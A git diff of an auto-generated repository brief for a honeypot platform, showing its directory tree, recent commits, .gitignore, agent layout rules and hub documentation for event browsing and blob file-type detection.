@@ -1,5 +1,523 @@
 # Repository Brief: hoho2
 
+_Generated 2026-02-13 04:11 UTC_
+
+## Quick Facts
+- **Branch:** main
+- **Commit:** c97ab78 (2026-02-13 03:55:48 +0000)
+- **Total commits:** 83
+- **Files scanned:** 155
+- **Text files embedded (after filters):** 151
+
+## Language & LOC Overview (approx.)
+- **python** — files: 53 (35.1%), LOC: 4092
+- **md** — files: 33 (21.9%), LOC: 8955
+- **other** — files: 14 (9.3%), LOC: 341
+- **yaml** — files: 11 (7.3%), LOC: 755
+- **bash** — files: 11 (7.3%), LOC: 317
+- **tsx** — files: 10 (6.6%), LOC: 476
+- **html** — files: 6 (4.0%), LOC: 31
+- **json** — files: 6 (4.0%), LOC: 737
+- **ts** — files: 4 (2.6%), LOC: 110
+- **toml** — files: 3 (2.0%), LOC: 48
+
+## Directory Tree (depth ≤ 10)
+
+```text
+- .gitignore
+- AGENTS.md
+- REPO_BRIEF.md
+- honeypot-platform
+  - docs
+    - ARCHITECTURE.md
+    - DEPLOYMENT.md
+    - DIRECTORY_LAYOUT.md
+    - DSL_REFERENCE.md
+    - EVENT_SCHEMA.md
+    - HUB.md
+    - PACK_SPEC.md
+    - README.md
+    - SECURITY.md
+    - SENSORS.md
+    - STORAGE_LAYOUT.md
+    - TELEMETRY_FILTERS.md
+    - TELEMETRY_SHIPPING.md
+  - hub
+    - Dockerfile
+    - docker-compose.yml
+    - requirements.txt
+  - scripts
+    - build_sensors.sh
+    - check_docs.sh
+    - check_layout.sh
+    - migrate_honeypots_layout.py
+    - validate_honeypots_layout.py
+  - deploy
+    - compose
+      - README.md
+    - runbooks
+      - high-interaction-honeypot-from-cve.md
+      - low-interaction-honeypot-from-cve.md
+    - app
+      - db.py
+      - filetype.py
+      - main.py
+    - webui
+      - index.html
+      - package.json
+      - tsconfig.json
+      - tsconfig.node.json
+      - vite.config.ts
+  - packages
+    - hoho_core
+      - pyproject.toml
+    - hoho_forwarder
+    - hoho_runtime
+  - runtimes
+    - low_runtime
+      - Dockerfile
+    - shipper
+  - sensors
+    - egress_proxy
+      - entrypoint.sh
+    - falco
+      - forwarder.py
+    - fsmon
+    - http_proxy
+    - pcap
+  - honeypots
+    - high
+      - cve-2017-12629_solr_rce
+        - README.md
+        - honeypot.yaml
+        - reset.sh
+      - cve-2020-25213_wp_file_upload
+      - cve-2021-41773_42013_apache_rce
+      - example-wp-stack
+    - low
+      - cve-2021-41773_apache-2-4-49-2-4-50-traversal-rce
+      - example-upload-sink
+      - example-web
+      - templates
+        - event.html
+        - events.html
+        - index.html
+        - sessions.html
+      - src
+        - App.tsx
+        - main.tsx
+      - hoho_core
+        - MANIFEST.in
+        - __init__.py
+        - version.py
+      - hoho_forwarder
+        - main.py
+      - hoho_runtime
+        - cli.py
+        - config.py
+        - env.py
+      - proxy
+        - egress_capture_addon.py
+        - gen_ca.py
+      - rules
+        - hoho_any_exec.yaml
+        - hoho_rules.yaml
+      - fsmon
+        - fsmon.py
+        - rules.schema.json
+        - capture_addon.py
+        - falco
+          - custom_rules.yaml
+    - data
+      - blobs
+        - 6b
+          - 6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b
+        - 99
+          - 996813623c4a172be25c35c15793237abb23aa94732155c0055c07f74bfc8e08
+        - e3
+          - e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+        - api
+          - client.ts
+          - types.ts
+        - components
+          - ArtifactTable.tsx
+          - EventFeed.tsx
+          - EventTable.tsx
+        - hooks
+          - useEventStream.ts
+        - pages
+          - Dashboard.tsx
+          - EventDetail.tsx
+          - Files.tsx
+          - Honeypot.tsx
+          - Session.tsx
+        - dsl
+          - __init__.py
+          - actions.py
+          - engine.py
+          - matchers.py
+          - templates.py
+        - model
+          - artifact.py
+          - event.py
+        - schema
+          - event_v2.json
+          - pack_v1.json
+          - validate.py
+          - validate_event.py
+        - storage
+          - base.py
+          - fs.py
+        - telemetry
+          - filters.py
+        - utils
+          - filenames.py
+          - hashing.py
+          - jsonl.py
+          - redact.py
+          - time.py
+        - container
+          - low_runtime.py
+        - orchestration
+          - ca_pregen.py
+          - compose_down_all.py
+          - compose_render.py
+          - compose_run.py
+          - hub_manage.py
+        - server
+          - http.py
+          - tcp.py
+          - shipper.py
+        - cve-2021-41773_42013
+          - cgi-bin
+            - health.sh
+          - htdocs
+            - index.html
+```
+
+## Recent Commits
+- c97ab78 | 2026-02-13 | up
+- ce10fa1 | 2026-02-13 | Merge branch 'main' of github.com:chudamax/hoho2
+- 11d7b90 | 2026-02-13 | Merge pull request #25 from chudamax/codex/show-detected-file-types-on-events-pages
+- f80e6b3 | 2026-02-13 | Show honeypot file path for event artifacts
+- 852c8ea | 2026-02-13 | Merge pull request #24 from chudamax/codex/add-file-type-detection-for-artifacts
+- 0aff8e7 | 2026-02-13 | Merge branch 'main' of github.com:chudamax/hoho2
+- d0144b3 | 2026-02-13 | hub: add cached blob file-type detection metadata
+- b776485 | 2026-02-13 | up
+- ee758a9 | 2026-02-13 | up
+- 44d7078 | 2026-02-13 | up
+
+## Files (embedded, trimmed)
+> Secret-looking lines are redacted by default. Large files are truncated to stay within budgets.
+
+### `.gitignore`  _(~5.1 KB; showing ≤800 lines)_
+```
+artifacts/
+run/
+deploy/
+honeypot-platform/sensors/*/packages/
+hub/data/
+*/honeypot-platform/hub/data/*
+
+# Byte-compiled / optimized / DLL files
+__pycache__/
+*.py[codz]
+*$py.class
+
+# C extensions
+*.so
+
+# Distribution / packaging
+.Python
+build/
+develop-eggs/
+dist/
+downloads/
+eggs/
+.eggs/
+lib/
+lib64/
+parts/
+sdist/
+var/
+wheels/
+share/python-wheels/
+*.egg-info/
+.installed.cfg
+*.egg
+MANIFEST
+
+# PyInstaller
+#  Usually these files are written by a python script from a template
+#  before PyInstaller builds the exe, so as to inject date/other infos into it.
+*.manifest
+*.spec
+
+# Installer logs
+pip-log.txt
+pip-delete-this-directory.txt
+
+# Unit test / coverage reports
+htmlcov/
+.tox/
+.nox/
+.coverage
+.coverage.*
+.cache
+nosetests.xml
+coverage.xml
+*.cover
+*.py.cover
+.hypothesis/
+.pytest_cache/
+cover/
+
+# Translations
+*.mo
+*.pot
+
+# Django stuff:
+*.log
+local_settings.py
+db.sqlite3
+db.sqlite3-journal
+
+# Flask stuff:
+instance/
+.webassets-cache
+
+# Scrapy stuff:
+.scrapy
+
+# Sphinx documentation
+docs/_build/
+
+# PyBuilder
+.pybuilder/
+target/
+
+# Jupyter Notebook
+.ipynb_checkpoints
+
+# IPython
+profile_default/
+ipython_config.py
+
+# pyenv
+#   For a library or package, you might want to ignore these files since the code is
+#   intended to run in multiple environments; otherwise, check them in:
+# .python-version
+
+# pipenv
+#   According to pypa/pipenv#598, it is recommended to include Pipfile.lock in version control.
+#   However, in case of collaboration, if having platform-specific dependencies or dependencies
+#   having no cross-platform support, pipenv may install dependencies that don't work, or not
+#   install all needed dependencies.
+#Pipfile.lock
+
+# UV
+#   Similar to Pipfile.lock, it is generally recommended to include uv.lock in version control.
+#   This is especially recommended for binary packages to ensure reproducibility, and is more
+#   commonly ignored for libraries.
+#uv.lock
+
+# poetry
+#   Similar to Pipfile.lock, it is generally recommended to include poetry.lock in version control.
+#   This is especially recommended for binary packages to ensure reproducibility, and is more
+#   commonly ignored for libraries.
+#   https://python-poetry.org/docs/basic-usage/#commit-your-poetrylock-file-to-version-control
+#poetry.lock
+#poetry.toml
+
+# pdm
+#   Similar to Pipfile.lock, it is generally recommended to include pdm.lock in version control.
+#   pdm recommends including project-wide configuration in pdm.toml, but excluding .pdm-python.
+#   https://pdm-project.org/en/latest/usage/project/#working-with-version-control
+#pdm.lock
+#pdm.toml
+.pdm-python
+.pdm-build/
+
+# pixi
+#   Similar to Pipfile.lock, it is generally recommended to include pixi.lock in version control.
+#pixi.lock
+#   Pixi creates a virtual environment in the .pixi directory, just like venv module creates one
+#   in the .venv directory. It is recommended not to include this directory in version control.
+.pixi
+
+# PEP 582; used by e.g. github.com/David-OConnor/pyflow and github.com/pdm-project/pdm
+__pypackages__/
+
+# Celery stuff
+celerybeat-schedule
+celerybeat.pid
+
+# SageMath parsed files
+*.sage.py
+
+# Environments
+.env
+.envrc
+.venv
+env/
+venv/
+ENV/
+env.bak/
+venv.bak/
+
+# Spyder project settings
+.spyderproject
+.spyproject
+
+# Rope project settings
+.ropeproject
+
+# mkdocs documentation
+/site
+
+# mypy
+.mypy_cache/
+.dmypy.json
+dmypy.json
+
+# Pyre type checker
+.pyre/
+
+# pytype static type analyzer
+.pytype/
+
+# Cython debug symbols
+cython_debug/
+
+# PyCharm
+#  JetBrains specific template is maintained in a separate JetBrains.gitignore that can
+#  be found at https://github.com/github/gitignore/blob/main/Global/JetBrains.gitignore
+#  and can be added to the global gitignore or merged into this file.  For a more nuclear
+#  option (not recommended) you can uncomment the following to ignore the entire idea folder.
+#.idea/
+
+# Abstra
+# Abstra is an AI-powered process automation framework.
+# Ignore directories containing user credentials, local state, and settings.
+# Learn more at https://abstra.io/docs
+.abstra/
+
+# Visual Studio Code
+#  Visual Studio Code specific template is maintained in a separate VisualStudioCode.gitignore 
+#  that can be found at https://github.com/github/gitignore/blob/main/Global/VisualStudioCode.gitignore
+#  and can be added to the global gitignore or merged into this file. However, if you prefer, 
+#  you could uncomment the following to ignore the entire vscode folder
+# .vscode/
+
+# Ruff stuff:
+.ruff_cache/
+
+# PyPI configuration file
+.pypirc
+
+# Cursor
+#  Cursor is an AI-powered code editor. `.cursorignore` specifies files/directories to
+#  exclude from AI features like autocomplete and code analysis. Recommended for sensitive data
+#  refer to https://docs.cursor.com/context/ignore-files
+.cursorignore
+.cursorindexingignore
+
+# Marimo
+marimo/_static/
+marimo/_lsp/
+__marimo__/
+
+# Generated compose/runtime outputs
+honeypot-platform/deploy/compose/*
+!honeypot-platform/deploy/compose/README.md
+honeypot-platform/run/artifacts/**
+
+honeypot-platform/deploy/compose/**/runtime/ca/**
+
+honeypot-platform/.env
+honeypot-platform/.env.*
+!honeypot-platform/.env.example
+honeypot-platform/hub/webui/node_modules/
+honeypot-platform/hub/webui/dist/
+honeypot-platform/hub/data/
+```
+
+### `AGENTS.md`  _(~3.4 KB; showing ≤800 lines)_
+```md
+# AGENTS.md (repo root)
+
+## Honeypot layout (Unified Layout v2)
+Authoritative spec: `honeypot-platform/docs/DIRECTORY_LAYOUT.md`.
+
+MUST:
+- Always use `honeypot_id == metadata.id`.
+- Create honeypots only at:
+  - `honeypot-platform/honeypots/low/<honeypot_id>/honeypot.yaml`
+  - `honeypot-platform/honeypots/high/<honeypot_id>/honeypot.yaml`
+- Create docs only at `honeypot-platform/honeypots/{low,high}/<honeypot_id>/README.md`.
+- Keep YAML-referenced local paths relative and inside the same honeypot folder.
+- Artifacts always go to `honeypot-platform/run/artifacts/<honeypot_id>/...`.
+- Compose output always goes to `honeypot-platform/deploy/compose/<honeypot_id>/docker-compose.yml`.
+
+MUST NOT:
+- Do not create `honeypot-platform/run/artifacts/<runs-subtree>/**` (no run-id subtrees).
+- Do not create non-canonical honeypot folders (example forbidden: `honeypots/high/2021-41773_42013/`).
+- Do not add new honeypot YAML definitions under `honeypot-platform/packs/`.
+
+## Deprecated compatibility
+- `honeypot-platform/packs/{low,high}/*.yaml` may still be invoked by CLI for one compatibility window.
+- CLI should emit deprecation warnings for `packs/` paths.
+
+## Docs that must be consulted (before implementing or changing honeypots)
+- Spec + schema rules: `honeypot-platform/docs/PACK_SPEC.md`
+- Sensor behavior + env contracts: `honeypot-platform/docs/SENSORS.md`
+- Storage layout + overwrite semantics: `honeypot-platform/docs/STORAGE_LAYOUT.md`
+- Deployment notes: `honeypot-platform/docs/DEPLOYMENT.md`
+- Compose output notes (incl. egress CA paths): `honeypot-platform/deploy/compose/README.md`
+
+## Runbooks (follow exactly)
+Low-interaction:
+- Always read: `honeypot-platform/docs/runbooks/low-interaction-honeypot-from-cve.md`
+
+High-interaction:
+- Always read: `honeypot-platform/docs/runbooks/high-interaction-honeypot-from-cve.md`
+
+## High-interaction capture baseline (recommended)
+For “high” stacks, default to maximum visibility:
+- `http_proxy` (reverse proxy) for inbound request/response metadata and request body capture.
+- `egress_proxy` (forward proxy) to capture **outbound** downloads (post-exploitation stage).
+- `fsmon` to capture file writes in shared mounted paths.
+- `pcap` for ground-truth network capture.
+
+## Egress proxy sensor guidance (important)
+Use `egress_proxy` when you want to capture attacker tooling fetched by the compromised container(s):
+- It emits `sensor.egress_proxy.http` events.
+- It can store response bodies as artifacts (`egress.response_body`) and also materialize symlinks under:
+  `run/artifacts/<honeypot_id>/objects/<event_id>/egress.response/<filename>`
+- With TLS MITM enabled, `hoho run` pre-generates a runtime CA under:
+  `deploy/compose/<honeypot_id>/runtime/ca/`
+  and the egress proxy exports the CA cert to:
+  `run/artifacts/<honeypot_id>/ca/egress-ca.crt`
+- If `tls_mitm.install_trust.enabled: true`, runtime executes `/hoho/ca/install-ca.sh` in attached services and emits:
+  `system.ca_install.succeeded` / `system.ca_install.failed` events.
+
+## Working reference honeypots (golden examples)
+High-interaction:
+- `honeypot-platform/honeypots/high/cve-2021-41773_42013_apache_rce/honeypot.yaml`
+
+Low-interaction:
+- `honeypot-platform/honeypots/low/cve-2021-41773_apache-2-4-49-2-4-50-traversal-rce/honeypot.yaml`
+
+## Operational commands (stop/cleanup)
+- Stop everything: `hoho down-all` (optionally `--volumes`)
+- Per-honeypot manual stop:
+  `docker compose -p "hoho-<honeypot_id>" -f deploy/compose/<honeypot_id>/docker-compose.yml down -v`
+```
+
+### `REPO_BRIEF.md`  _(~250.0 KB; showing ≤800 lines)_
+```md
+# Repository Brief: hoho2
+
 _Generated 2026-02-12 15:52 UTC_
 
 ## Quick Facts
@@ -192,7 +710,7 @@ _Generated 2026-02-12 15:52 UTC_
 - 7658593 | 2026-02-12 | Implement telemetry v2 contracts, filtering, forwarder, and hub scaffolding
 
 ## Files (embedded, trimmed)
-> Secret-looking lines are redacted by default. Large files are truncated to stay within budgets.
+[REDACTED]
 
 ### `.gitignore`  _(~4.9 KB; showing ≤800 lines)_
 ```
@@ -798,503 +1316,6 @@ ipython_config.py
 #   Similar to Pipfile.lock, it is generally recommended to include pixi.lock in version control.
 #pixi.lock
 #   Pixi creates a virtual environment in the .pixi directory, just like venv module creates one
-#   in the .venv directory. It is recommended not to include this directory in version control.
-.pixi
-
-# PEP 582; used by e.g. github.com/David-OConnor/pyflow and github.com/pdm-project/pdm
-__pypackages__/
-
-# Celery stuff
-celerybeat-schedule
-celerybeat.pid
-
-# SageMath parsed files
-*.sage.py
-
-# Environments
-.env
-.envrc
-.venv
-env/
-venv/
-ENV/
-env.bak/
-venv.bak/
-
-# Spyder project settings
-.spyderproject
-.spyproject
-
-# Rope project settings
-.ropeproject
-
-# mkdocs documentation
-/site
-
-# mypy
-.mypy_cache/
-.dmypy.json
-dmypy.json
-
-# Pyre type checker
-.pyre/
-
-# pytype static type analyzer
-.pytype/
-
-# Cython debug symbols
-cython_debug/
-
-# PyCharm
-#  JetBrains specific template is maintained in a separate JetBrains.gitignore that can
-#  be found at https://github.com/github/gitignore/blob/main/Global/JetBrains.gitignore
-#  and can be added to the global gitignore or merged into this file.  For a more nuclear
-#  option (not recommended) you can uncomment the following to ignore the entire idea folder.
-#.idea/
-
-# Abstra
-# Abstra is an AI-powered process automation framework.
-# Ignore directories containing user credentials, local state, and settings.
-# Learn more at https://abstra.io/docs
-.abstra/
-
-# Visual Studio Code
-#  Visual Studio Code specific template is maintained in a separate VisualStudioCode.gitignore 
-#  that can be found at https://github.com/github/gitignore/blob/main/Global/VisualStudioCode.gitignore
-#  and can be added to the global gitignore or merged into this file. However, if you prefer, 
-#  you could uncomment the following to ignore the entire vscode folder
-# .vscode/
-
-# Ruff stuff:
-.ruff_cache/
-
-# PyPI configuration file
-.pypirc
-
-# Cursor
-#  Cursor is an AI-powered code editor. `.cursorignore` specifies files/directories to
-#  exclude from AI features like autocomplete and code analysis. Recommended for sensitive data
-#  refer to https://docs.cursor.com/context/ignore-files
-.cursorignore
-.cursorindexingignore
-
-# Marimo
-marimo/_static/
-marimo/_lsp/
-__marimo__/
-
-# Generated compose/runtime outputs
-honeypot-platform/deploy/compose/*
-!honeypot-platform/deploy/compose/README.md
-honeypot-platform/run/artifacts/**
-
-honeypot-platform/deploy/compose/**/runtime/ca/**
-
-honeypot-platform/.env
-honeypot-platform/.env.*
-!honeypot-platform/.env.example
-```
-
-### `AGENTS.md`  _(~3.4 KB; showing ≤800 lines)_
-```md
-# AGENTS.md (repo root)
-
-## Honeypot layout (Unified Layout v2)
-Authoritative spec: `honeypot-platform/docs/DIRECTORY_LAYOUT.md`.
-
-MUST:
-- Always use `honeypot_id == metadata.id`.
-- Create honeypots only at:
-  - `honeypot-platform/honeypots/low/<honeypot_id>/honeypot.yaml`
-  - `honeypot-platform/honeypots/high/<honeypot_id>/honeypot.yaml`
-- Create docs only at `honeypot-platform/honeypots/{low,high}/<honeypot_id>/README.md`.
-- Keep YAML-referenced local paths relative and inside the same honeypot folder.
-- Artifacts always go to `honeypot-platform/run/artifacts/<honeypot_id>/...`.
-- Compose output always goes to `honeypot-platform/deploy/compose/<honeypot_id>/docker-compose.yml`.
-
-MUST NOT:
-- Do not create `honeypot-platform/run/artifacts/<runs-subtree>/**` (no run-id subtrees).
-- Do not create non-canonical honeypot folders (example forbidden: `honeypots/high/2021-41773_42013/`).
-- Do not add new honeypot YAML definitions under `honeypot-platform/packs/`.
-
-## Deprecated compatibility
-- `honeypot-platform/packs/{low,high}/*.yaml` may still be invoked by CLI for one compatibility window.
-- CLI should emit deprecation warnings for `packs/` paths.
-
-## Docs that must be consulted (before implementing or changing honeypots)
-- Spec + schema rules: `honeypot-platform/docs/PACK_SPEC.md`
-- Sensor behavior + env contracts: `honeypot-platform/docs/SENSORS.md`
-- Storage layout + overwrite semantics: `honeypot-platform/docs/STORAGE_LAYOUT.md`
-- Deployment notes: `honeypot-platform/docs/DEPLOYMENT.md`
-- Compose output notes (incl. egress CA paths): `honeypot-platform/deploy/compose/README.md`
-
-## Runbooks (follow exactly)
-Low-interaction:
-- Always read: `honeypot-platform/docs/runbooks/low-interaction-honeypot-from-cve.md`
-
-High-interaction:
-- Always read: `honeypot-platform/docs/runbooks/high-interaction-honeypot-from-cve.md`
-
-## High-interaction capture baseline (recommended)
-For “high” stacks, default to maximum visibility:
-- `http_proxy` (reverse proxy) for inbound request/response metadata and request body capture.
-- `egress_proxy` (forward proxy) to capture **outbound** downloads (post-exploitation stage).
-- `fsmon` to capture file writes in shared mounted paths.
-- `pcap` for ground-truth network capture.
-
-## Egress proxy sensor guidance (important)
-Use `egress_proxy` when you want to capture attacker tooling fetched by the compromised container(s):
-- It emits `sensor.egress_proxy.http` events.
-- It can store response bodies as artifacts (`egress.response_body`) and also materialize symlinks under:
-  `run/artifacts/<honeypot_id>/objects/<event_id>/egress.response/<filename>`
-- With TLS MITM enabled, `hoho run` pre-generates a runtime CA under:
-  `deploy/compose/<honeypot_id>/runtime/ca/`
-  and the egress proxy exports the CA cert to:
-  `run/artifacts/<honeypot_id>/ca/egress-ca.crt`
-- If `tls_mitm.install_trust.enabled: true`, runtime executes `/hoho/ca/install-ca.sh` in attached services and emits:
-  `system.ca_install.succeeded` / `system.ca_install.failed` events.
-
-## Working reference honeypots (golden examples)
-High-interaction:
-- `honeypot-platform/honeypots/high/cve-2021-41773_42013_apache_rce/honeypot.yaml`
-
-Low-interaction:
-- `honeypot-platform/honeypots/low/cve-2021-41773_apache-2-4-49-2-4-50-traversal-rce/honeypot.yaml`
-
-## Operational commands (stop/cleanup)
-- Stop everything: `hoho down-all` (optionally `--volumes`)
-- Per-honeypot manual stop:
-  `docker compose -p "hoho-<honeypot_id>" -f deploy/compose/<honeypot_id>/docker-compose.yml down -v`
-```
-
-### `REPO_BRIEF.md`  _(~230.0 KB; showing ≤800 lines)_
-```md
-# Repository Brief: hoho2
-
-_Generated 2026-02-12 13:24 UTC_
-
-## Quick Facts
-- **Branch:** main
-- **Commit:** 735b926 (2026-02-12 14:16:27 +0100)
-- **Total commits:** 63
-- **Files scanned:** 123
-- **Text files embedded (after filters):** 122
-
-## Language & LOC Overview (approx.)
-- **python** — files: 48 (39.3%), LOC: 3047
-- **md** — files: 32 (26.2%), LOC: 7427
-- **yaml** — files: 11 (9.0%), LOC: 755
-- **bash** — files: 11 (9.0%), LOC: 295
-- **other** — files: 9 (7.4%), LOC: 292
-- **html** — files: 5 (4.1%), LOC: 19
-- **json** — files: 3 (2.5%), LOC: 681
-- **toml** — files: 3 (2.5%), LOC: 48
-
-## Directory Tree (depth ≤ 10)
-
-```text
-- .gitignore
-- AGENTS.md
-- REPO_BRIEF.md
-- honeypot-platform
-  - docs
-    - ARCHITECTURE.md
-    - DEPLOYMENT.md
-    - DIRECTORY_LAYOUT.md
-    - DSL_REFERENCE.md
-    - EVENT_SCHEMA.md
-    - HUB.md
-    - PACK_SPEC.md
-    - README.md
-    - SECURITY.md
-    - SENSORS.md
-    - STORAGE_LAYOUT.md
-    - TELEMETRY_FILTERS.md
-    - TELEMETRY_FORWARDING.md
-  - hub
-    - Dockerfile
-    - docker-compose.yml
-  - scripts
-    - build_sensors.sh
-    - check_docs.sh
-    - check_layout.sh
-    - migrate_honeypots_layout.py
-    - validate_honeypots_layout.py
-  - deploy
-    - compose
-      - README.md
-    - runbooks
-      - high-interaction-honeypot-from-cve.md
-      - low-interaction-honeypot-from-cve.md
-    - app
-      - db.py
-      - main.py
-  - packages
-    - hoho_core
-      - pyproject.toml
-    - hoho_forwarder
-    - hoho_runtime
-  - runtimes
-    - low_runtime
-      - Dockerfile
-  - sensors
-    - egress_proxy
-      - entrypoint.sh
-    - falco
-      - forwarder.py
-    - fsmon
-    - http_proxy
-    - pcap
-  - honeypots
-    - high
-      - cve-2017-12629_solr_rce
-        - README.md
-        - honeypot.yaml
-        - reset.sh
-      - cve-2020-25213_wp_file_upload
-      - cve-2021-41773_42013_apache_rce
-      - example-wp-stack
-    - low
-      - cve-2021-41773_apache-2-4-49-2-4-50-traversal-rce
-      - example-upload-sink
-      - example-web
-      - templates
-        - event.html
-        - events.html
-        - index.html
-        - sessions.html
-      - hoho_core
-        - MANIFEST.in
-        - __init__.py
-        - version.py
-      - hoho_forwarder
-        - main.py
-      - hoho_runtime
-        - cli.py
-        - config.py
-      - proxy
-        - egress_capture_addon.py
-        - gen_ca.py
-      - rules
-        - hoho_any_exec.yaml
-        - hoho_rules.yaml
-      - fsmon
-        - fsmon.py
-        - rules.schema.json
-        - capture_addon.py
-        - falco
-          - custom_rules.yaml
-        - dsl
-          - __init__.py
-          - actions.py
-          - engine.py
-          - matchers.py
-          - templates.py
-        - model
-          - artifact.py
-          - event.py
-        - schema
-          - event_v2.json
-          - pack_v1.json
-          - validate.py
-          - validate_event.py
-        - storage
-          - base.py
-          - fs.py
-        - telemetry
-          - filters.py
-        - utils
-          - filenames.py
-          - hashing.py
-          - jsonl.py
-          - redact.py
-          - time.py
-        - container
-          - low_runtime.py
-        - orchestration
-          - ca_pregen.py
-          - compose_down_all.py
-          - compose_render.py
-          - compose_run.py
-        - server
-          - http.py
-          - tcp.py
-        - cve-2021-41773_42013
-          - cgi-bin
-            - health.sh
-          - htdocs
-            - index.html
-```
-
-## Recent Commits
-- 735b926 | 2026-02-12 | Merge pull request #20 from chudamax/codex/implement-telemetry-v2-with-event-contracts
-- 7658593 | 2026-02-12 | Implement telemetry v2 contracts, filtering, forwarder, and hub scaffolding
-- 4a43fb9 | 2026-02-12 | falcon is working
-- dd60f89 | 2026-02-12 | Merge pull request #19 from chudamax/codex/move-falco-rules-to-yaml-and-fix-startup-errors
-- 1925c7a | 2026-02-12 | Move Falco defaults into image rules and fix startup args
-- 982f536 | 2026-02-12 | up
-- 6f711d7 | 2026-02-12 | Merge pull request #18 from chudamax/codex/add-falco-sensor-for-runtime-telemetry
-- 1a4e5dd | 2026-02-12 | Add falco sensor integration with compose rendering and docs
-- 4d26738 | 2026-02-12 | up
-- 1fdd0df | 2026-02-12 | Merge pull request #17 from chudamax/codex/containerize-low-interaction-honeypots
-
-## Files (embedded, trimmed)
-[REDACTED]
-
-### `.gitignore`  _(~4.8 KB; showing ≤800 lines)_
-```
-artifacts/
-run/
-deploy/
-
-# Byte-compiled / optimized / DLL files
-__pycache__/
-*.py[codz]
-*$py.class
-
-# C extensions
-*.so
-
-# Distribution / packaging
-.Python
-build/
-develop-eggs/
-dist/
-downloads/
-eggs/
-.eggs/
-lib/
-lib64/
-parts/
-sdist/
-var/
-wheels/
-share/python-wheels/
-*.egg-info/
-.installed.cfg
-*.egg
-MANIFEST
-
-# PyInstaller
-#  Usually these files are written by a python script from a template
-#  before PyInstaller builds the exe, so as to inject date/other infos into it.
-*.manifest
-*.spec
-
-# Installer logs
-pip-log.txt
-pip-delete-this-directory.txt
-
-# Unit test / coverage reports
-htmlcov/
-.tox/
-.nox/
-.coverage
-.coverage.*
-.cache
-nosetests.xml
-coverage.xml
-*.cover
-*.py.cover
-.hypothesis/
-.pytest_cache/
-cover/
-
-# Translations
-*.mo
-*.pot
-
-# Django stuff:
-*.log
-local_settings.py
-db.sqlite3
-db.sqlite3-journal
-
-# Flask stuff:
-instance/
-.webassets-cache
-
-# Scrapy stuff:
-.scrapy
-
-# Sphinx documentation
-docs/_build/
-
-# PyBuilder
-.pybuilder/
-target/
-
-# Jupyter Notebook
-.ipynb_checkpoints
-
-# IPython
-profile_default/
-ipython_config.py
-
-# pyenv
-#   For a library or package, you might want to ignore these files since the code is
-#   intended to run in multiple environments; otherwise, check them in:
-# .python-version
-
-# pipenv
-#   According to pypa/pipenv#598, it is recommended to include Pipfile.lock in version control.
-#   However, in case of collaboration, if having platform-specific dependencies or dependencies
-#   having no cross-platform support, pipenv may install dependencies that don't work, or not
-#   install all needed dependencies.
-#Pipfile.lock
-
-# UV
-#   Similar to Pipfile.lock, it is generally recommended to include uv.lock in version control.
-#   This is especially recommended for binary packages to ensure reproducibility, and is more
-#   commonly ignored for libraries.
-#uv.lock
-
-# poetry
-#   Similar to Pipfile.lock, it is generally recommended to include poetry.lock in version control.
-#   This is especially recommended for binary packages to ensure reproducibility, and is more
-#   commonly ignored for libraries.
-#   https://python-poetry.org/docs/basic-usage/#commit-your-poetrylock-file-to-version-control
-#poetry.lock
-#poetry.toml
-
-# pdm
-#   Similar to Pipfile.lock, it is generally recommended to include pdm.lock in version control.
-#   pdm recommends including project-wide configuration in pdm.toml, but excluding .pdm-python.
-#   https://pdm-project.org/en/latest/usage/project/#working-with-version-control
-#pdm.lock
-#pdm.toml
-.pdm-python
-.pdm-build/
-
-# pixi
-#   Similar to Pipfile.lock, it is generally recommended to include pixi.lock in version control.
-#pixi.lock
-#   Pixi creates a virtual environment in the .pixi directory, just like venv module creates one
-#   in the .venv directory. It is recommended not to include this directory in version control.
-.pixi
-
-# PEP 582; used by e.g. github.com/David-OConnor/pyflow and github.com/pdm-project/pdm
-__pypackages__/
-
-# Celery stuff
-celerybeat-schedule
-celerybeat.pid
-
-# SageMath parsed files
-*.sage.py
-
-# Environments
-.env
-.envrc
-.venv
-env/
-venv/
-ENV/
-env.bak/
-venv.bak/
-
-# Spyder project settings
-.spyderproject
 ```
 <!-- trimmed: file exceeded per-file limits -->
 
@@ -1529,21 +1550,23 @@ All telemetry producers emit schema version `2`.
 ```
 ```
 
-### `honeypot-platform/docs/HUB.md`  _(~0.8 KB; showing ≤800 lines)_
+### `honeypot-platform/docs/HUB.md`  _(~2.1 KB; showing ≤800 lines)_
 ```md
 # HOHO Hub
 
 Hub lives under `honeypot-platform/hub/` and provides:
 - ingest APIs for events/blobs
-- lightweight HTML pages for browsing honeypots/sessions/events
+- SPA web GUI for browsing honeypots/sessions/events/files
+- live events via SSE
 - blob downloads by sha256
+- blob file type detection metadata (libmagic-based)
 
 ## Global .env
 Use the shared env file at `honeypot-platform/.env` for hub + shipper.
 
 Common vars:
 - `HOHO_HUB_URL`
-- `HOHO_HUB_TOKEN`
+- `HOHO_HUB_TOKEN` (optional; empty disables auth)
 
 Create it from template:
 ```bash
@@ -1557,6 +1580,49 @@ hoho hub up
 hoho hub logs
 hoho hub down
 ```
+
+## UI and API
+- UI: `http://localhost:8000/ui/`
+- `/` redirects to `/ui/`
+- Live stream endpoint: `/api/v1/stream/events`
+
+### File type detection metadata
+Blob metadata is stored in `blob_meta` (SQLite), keyed by blob SHA256 and reused across artifacts.
+
+Metadata fields:
+- `detected_desc` (human-readable file-style description)
+- `detected_mime`
+- `guessed_ext`
+
+Artifacts API (`/api/v1/artifacts`) includes these fields, and supports `detected_mime_prefix=` filtering.
+
+Optional blob metadata endpoint:
+- `GET /api/v1/blobs/{sha}/meta`
+
+Env flags:
+- `HOHO_HUB_FILETYPE_DETECT` (default `1`)
+- `HOHO_HUB_FILETYPE_DETECT_MAX_BYTES` (default `262144`)
+- `HOHO_HUB_FILETYPE_LAZY` (default `0`; if `1`, detect on first read instead of upload)
+- `HOHO_HUB_FILETYPE_BACKFILL` (default `0`; startup backfill)
+- `HOHO_HUB_FILETYPE_BACKFILL_LIMIT` (default `100`; max blobs per startup)
+
+Detection failures never fail blob upload; hub logs warning and continues.
+
+## Local dev workflow
+Run the API:
+```bash
+cd honeypot-platform/hub
+uvicorn app.main:app --host 0.0.0.0 --port 8000 --reload
+```
+
+Run SPA dev server with proxy:
+```bash
+cd honeypot-platform/hub/webui
+npm install
+npm run dev
+```
+
+The Vite dev proxy forwards `/api` and `/blobs` to `http://localhost:8000`.
 
 ## Alternative raw compose command
 ```bash
@@ -2931,20 +2997,42 @@ sensors:
       service: honeypot
 ```
 
